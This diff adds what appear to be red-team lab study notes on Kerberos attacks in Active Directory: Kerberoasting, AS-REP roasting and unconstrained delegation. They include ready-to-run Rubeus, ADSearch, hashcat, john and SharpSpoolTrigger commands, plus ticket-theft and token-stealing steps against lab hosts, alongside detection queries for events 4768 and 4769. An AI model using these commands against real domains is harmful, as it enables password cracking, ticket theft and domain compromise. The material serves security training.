@@ -11,4 +11,96 @@ When a user logs onto their workstation it sends an AS-REQ to the Key Distributi
 | Present TGS to service | -> | -> | -> | • |
 | • | <- | <- | <- | Grant access |
 
+## Kerberoasting
+
+Services run on a machine under the context of a user account; local (LocalSystem, LocalService, NetworkService) or domain accounts (e.g. DOMAIN\mssql). A Service Principal Name (SPN) is a unique identifier of a service instance. SPNs are used with Kerberos to associate a service instance with a logon account, and are configured on the User Object in AD (e.g. MSSQLSvc.sql-2.dev.corp.io:1433 in the service's properties).
+
+Part of the TGS returned by the KDC is encrypted with a secret derived from the password of the user account running that service. Kerberoasting requests TGSs for services running under the context of domain accounts and cracks them offline to reveal their plaintext passwords. Rubeus Kerberoast can be used to perform the kerberoasting. Running it without further arguments will roast every account in the domain that has an SPN (excluding krbtgt). 
+
+```beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe kerberoast /simple /nowrap``` returns long hashes which can be cracked offline to recover the plaintext passwords for the accounts. Use:
+
+* ```john --format=krb5tgs --wordlist=wordlist hashes``` or
+* ```hashcat -a 0 -m 13100 hashes wordlist```
+
+...but some hash format incompatibility with john. Remove the SPN from: 
+
+    $krb5tgs$23$*mssql_svc$dev.cyberbotic.io$MSSQLSvc...
+
+to: 
+
+    $krb5tgs$23$*mssql_svc$dev.cyberbotic.io...
+
+
+But, honeypot accounts can be configured with a "fake" SPN, which will generate a 4769 event when roasted. Since these events will never be generated for this service, it provides a high-fidelity indication of this attack: ```event.code: 4769 and winlog.event_data.ServiceName: honey_svc```. Safer to enumerate candidate users first and roast them selectively. This LDAP query will find domain users who have an SPN set: 
+
+    beacon> execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "(&(objectCategory=user)(servicePrincipalName=*))" --attributes cn,servicePrincipalName,samAccountName
+
+Then roast an individual account: ```execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe kerberoast /user:mssql_svc /nowrap```
+
+## ASREP Roasting
+
+If a user does not have Kerberos pre-authentication enabled, an AS-REP can be requested for that user, and part of the reply can be cracked offline for the plaintext password. This is enabled on the User Object, often seen on Linux accounts. 
+
+Of course don't asreproast every account in the domain: 
+
+    execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "(&(objectCategory=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" --attributes cn,distinguishedname,samaccountname
+    execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asreproast /user:squid_svc /nowrap
+
+Use:
+
+* ```john --format=krb5asrep --wordlist=wordlist squid_svc``` or
+* ```hashcat -a 0 -m 18200 squid_svc wordlist```
+
+Catch: ASREPRoasting generates a 4768 event with RC4 encryption and a preauth type of 0:
+
+    event.code: 4768 and winlog.event_data.PreAuthType: 0
+    winlog.event_data.TicketEncryptionType: 0x17
+
+
+## Unconstrained Delegation
+
+Delegation allows a user or machine to act on behalf of another user to another service (e.g. user authenticates to a front-end web app that serves a back-end database -- the app authenticates to the DB using Kerberos as the authenticated user). When set up, unconstrained delegation makes KDC include the user's TGT inside the TGS. In this example, when the user accesses the Web Server, it caches the user's TGT. When the Web Server needs to access the DB Server on behalf of that user, it uses the TGT to request a TGS for the database service. It will cache the user’s TGT regardless of which service is being accessed by the user. So, if an admin accesses a file share or any other service on the machine that uses Kerberos, their TGT will be cached and can be extracted memory for nefarious use against other services in the domain.
+
+To return all computers that are permitted for unconstrained delegation: ```execute-assembly ADSearch.exe --search "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" --attributes samaccountname,dnshostname```
+
+Domain Controllers are always permitted for unconstrained delegation.
+
+If we compromise WEB$ and wait or socially engineer a privileged user to interact with it, we can steal their cached TGT.  Interaction can be via any Kerberos service, so something as simple as dir \\web\c$ is enough. Rubeus triage will show all the tickets that are currently cached. TGTs can be identified by the krbtgt service.
+
+    beacon> getuid
+    [*] You are NT AUTHORITY\SYSTEM (admin)
+    beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe triage
+
+Extract this TGT and leverage it via a new logon session:
+
+    beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:0x14794e /nowrap
+    beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:nlamb /password:FakePass /ticket:doIFwj[...]MuSU8=
+    beacon> steal_token 1540
+    beacon> ls \\dc-2.dev.cyberbotic.io\c$
+
+For the lab: A task running on Workstation 1 as nlamb interacts with WEB$ every 5 minutes. If the ticket is not there, wait and try again.
+
+Can also get a TGT for accounts by forcing them to authenticate remotely to the machine. (See the NTLM Relaying module in  Pivoting for tools for this.) This time, force the domain controller to authenticate to the web server to steal its TGT. Also use Rubeus' monitor command, which continuously monitors for and extract new TGTs as they get cached. It's a superior strategy when compared to running triage manually because there's little chance of us not seeing or missing a ticket.
+
+    beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe monitor /interval:10 /nowrap
+
+then run SharpSpoolTrigger:
+
+    beacon> execute-assembly SharpSpoolTrigger.exe dc-2.dev.cyberbotic.io web.dev.cyberbotic.io
+
+Where:
+
+  * DC-2 is the target
+  * WEB is the listener
+
+Rubeus will then capture the ticket. To stop Rubeus, use the jobs and jobkill commands.
+
+Machine TGTs are leveraged slightly differently -- see S4U2Self Abuse later.  
+
+## Constrained Delegation
+
+Constrained delegation is a safer means for services to perform Kerberos delegation. It aims to restrict the services to which the server can act on behalf of a user.  It no longer allows the server to cache the TGTs of other users, but allows it to request a TGS for another user with its own TGT.
+
+
+
 
